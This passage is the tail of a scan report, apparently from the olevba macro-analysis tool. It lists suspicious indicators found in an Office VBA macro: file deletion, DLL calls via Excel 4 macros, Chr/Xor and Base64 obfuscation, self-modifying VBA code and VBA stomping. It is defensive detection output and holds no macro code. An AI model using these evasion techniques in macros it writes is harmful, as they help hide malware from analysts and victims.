|          |                    |opened                                       |
|Suspicious|open                |May open a file                              |
|Suspicious|kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

